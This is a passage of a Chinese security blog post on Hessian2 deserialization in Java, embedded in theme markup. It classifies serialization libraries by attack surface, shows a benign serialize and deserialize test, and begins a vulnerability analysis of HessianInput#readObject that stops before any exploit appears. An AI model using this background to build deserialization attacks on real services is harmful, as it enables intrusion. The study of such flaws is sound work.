<!DOCTYPE html>
<html lang="zh-CN">

    
        <script src="/js/custom/love.min.js"></script>
    


<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Ko1sh1">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2023/05/20/blog_hessian2 反序列化/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="近期学习Hessian2 反序列化的总结归纳">
<meta property="og:type" content="article">
<meta property="og:title" content="Hessian2 反序列化">
<meta property="og:url" content="http://example.com/2023/05/20/blog_hessian2%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="近期学习Hessian2 反序列化的总结归纳">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/blog/image-20230208224543523.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230208225258972.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230208225728424.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230208231744002.png">
<meta property="og:image" content="http://example.com/images/blog/1651123884314.png">
<meta property="og:image" content="http://example.com/images/blog/1651213661427.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230209164320207.png">
<meta property="og:image" content="http://example.com/images/blog/107563321d94b95289886d9d7f615782.png">
<meta property="og:image" content="http://example.com/images/blog/1651139384898.png">
<meta property="og:image" content="http://example.com/images/blog/dae46fcd0fd2ce47170e48bd1ec65340.png">
<meta property="og:image" content="http://example.com/images/blog/8.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230210170754131.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230210171612201.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230210171807540.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230210171902375.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230210172357645.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230210175124400.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230218175403683.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230218180353389.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230222211619476.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230222223152065.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230222223021368.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230222223854166.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230222224154420.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230222224404105.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230222225446664.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230223191542233.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230223223229206.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230223222905078.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230223225520755.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230224095800824.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230224101636714.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230224171853534.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230225105746044.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230225105828181.png">
<meta property="og:image" content="http://example.com/images/blog/image-20230225110006619.png">
<meta property="og:image" content="http://example.com/images/blog/1651142700263.png">
<meta property="article:published_time" content="2023-05-19T21:18:02.000Z">
<meta property="article:modified_time" content="2024-05-30T13:38:43.756Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="java 反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/blog/image-20230208224543523.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/avatar.jpg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
    <meta name="theme-color" content="#FFA07A">
    <link rel="shortcut icon" href="/images/avatar.jpg">
    <!--- Page Info-->
    
    <title>
        
            Hessian2 反序列化 -
        
        Ko1sh1&#39;s Blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    
        
            
    
            
    
            
                
                    <style> .home-banner-container .content div:nth-child(2) { justify-content: center !important;  } .home-banner-container .content div:nth-child(2) div:first-child { display: none !important; } </style>
                
    
            
                
                    <script data-swup-reload-script src='/js/custom/jquery.min.js'></script>
                
    
            
                
                    <script data-swup-reload-script src='/js/custom/text.js'></script>
                
    
            
                
                    <link rel='stylesheet' href='/css/mouse.css'>
                
    

    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    <!--- Font Part-->
    
        <link href="/fonts/fonts.css" rel="stylesheet">
    
    
    
        <link href="/fonts/fonts.css" rel="stylesheet">
    
    
        <link href="/fonts/fonts.css" rel="stylesheet">
    


    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFA07A","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"english":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":false,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/b.jpg","dark":"/images/b.jpg"},"title":"Ko1sh1's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#FF7569","dark":"#FF7569"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ko1sh1","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null,"qq":"/images/qq.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"雨に濡れた空気","artist":"春野杉卉","url":"/musics/雨に濡れた空気.mp3","cover":"/images/雨に濡れた空気.jpg"},{"name":"悋気","artist":"iwamizu","url":"/musics/悋気.mp3","cover":"/images/悋気.jpg"},{"name":"天空之城","artist":"StudioEIM","url":"/musics/天空之城.mp3","cover":"/images/天空之城.jpg"},{"name":"星茶会","artist":"灰澈","url":"/musics/星茶会.mp3","cover":"/images/星茶会.jpg"},{"name":"Talking to the Moon","artist":"MT1990","url":"/musics/Talking to the Moon.mp3","cover":"/images/Talking to the Moon.jpg"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":true,"color":{"left":"#87CEEB","right":"#FFB6C1","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Photos":{"path":"/masonry","icon":"fa-regular fa-image"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/2/5 17:00:00"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.1.1"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



    
        <script src="/js/custom/love.min.js"></script>
    


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">

    <div class="navbar-content ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Ko1sh1&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    归档
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories"
                                        >
                                    <i class="fa-regular fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    关于
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a href="/about">
                                                    ME
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a href="/links/">
                                                    师傅们
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                归档
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-About"
                        >
                            <span>
                                关于
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/about">ME</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/links/">师傅们</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/tags"
                        >
                            <span>Tags</span>
                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/masonry"
                        >
                            <span>Photos</span>
                            <i class="fa-regular fa-image fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    
    
        <script src="/js/custom/love.min.js"></script>
    


<div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                
                
                <img src="/images/blog7.jpg" alt="Hessian2 反序列化" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
                
                <div class="w-full flex items-center absolute bottom-0 justify-start">
                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">Hessian2 反序列化</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/avatar.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Ko1sh1</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2023-05-20 05:18:02</span>
        <span class="mobile">2023-05-20 05:18:02</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-05-30 21:38:43</span>
            <span class="mobile">2024-05-30 21:38:43</span>
            <span class="hover-info">更新</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/java/">java</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java 反序列化</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>14.6k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>70 分钟</span>
        </span>
    
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h2 id="反序列化机制（了解即可）"><a href="#反序列化机制（了解即可）" class="headerlink" title="反序列化机制（了解即可）"></a>反序列化机制（了解即可）</h2><p>序列化&#x2F;反序列化机制分大体分为两类</p>
<ul>
<li>基于Bean属性访问机制</li>
<li>基于Field机制</li>
</ul>
<h3 id="基于Bean属性访问机制"><a href="#基于Bean属性访问机制" class="headerlink" title="基于Bean属性访问机制"></a>基于Bean属性访问机制</h3><p>它们最基本的区别是如何在对象上设置属性值，它们有共同点，也有自己独有的不同处理方式。有的通过反射自动调用<code>getter(xxx)</code>和<code>setter(xxx)</code>访问对象属性，有的还需要调用默认Constructor，有的处理器（指的上面列出来的那些）在反序列化对象时，如果类对象的某些方法还满足自己设定的某些要求，也会被自动调用。还有XMLDecoder这种能调用对象任意方法的处理器。有的处理器在支持多态特性时，例如某个对象的某个属性是Object、Interface、abstruct等类型，为了在反序列化时能完整恢复，需要写入具体的类型信息，这时候可以指定更多的类，在反序列化时也会自动调用具体类对象的某些方法来设置这些对象的属性值。</p>
<p>这种机制的攻击面比基于Field机制的攻击面大，因为它们自动调用的方法以及在支持多态特性时自动调用方法比基于Field机制要多。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SnakeYAML</span><br><span class="line">jYAML</span><br><span class="line">YamlBeans</span><br><span class="line">Apache Flex BlazeDS</span><br><span class="line">Red5 IO AMF</span><br><span class="line">Jackson</span><br><span class="line">Fastjson</span><br><span class="line">Castor</span><br><span class="line">Java XMLDecoder</span><br><span class="line">…</span><br></pre></td></tr></table></figure></div>



<h3 id="基于Field机制"><a href="#基于Field机制" class="headerlink" title="基于Field机制"></a>基于Field机制</h3><p>基于Field机制的反序列化是通过特殊的native（方法或反射（最后也是使用了native方式）直接对Field进行赋值操作的机制，而不是通过getter、setter方式对属性赋值。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java Serialization</span><br><span class="line">Kryo</span><br><span class="line">Hessian</span><br><span class="line">json-io</span><br><span class="line">XStream</span><br></pre></td></tr></table></figure></div>



<h2 id="Hessian2-序列化与反序列化简单测试"><a href="#Hessian2-序列化与反序列化简单测试" class="headerlink" title="Hessian2 序列化与反序列化简单测试"></a>Hessian2 序列化与反序列化简单测试</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>Person.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p><strong>Hessian_Test.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bas);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        System.out.println(<span class="string">&quot;java原生: &quot;</span>+bas.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hessian2: &quot;</span>+bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setAge(<span class="number">18</span>);</span><br><span class="line">        person.setName(<span class="string">&quot;Koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(person);</span><br><span class="line">        System.out.println((Person) deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230208224543523.png"
                      alt="image-20230208224543523"
                ></p>
<p><strong>相较于原生的反序列化，Hessian反序列化占用空间更小。</strong></p>
<h1 id="Hessian2-反序列化漏洞分析"><a href="#Hessian2-反序列化漏洞分析" class="headerlink" title="Hessian2 反序列化漏洞分析"></a>Hessian2 反序列化漏洞分析</h1><p>Hessian反序列化漏洞的关键出在<code>HessianInput#readObject</code>，由于Hessian会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为77）。下面我们跟进<code>readObject()</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230208225258972.png"
                      alt="image-20230208225258972"
                ></p>
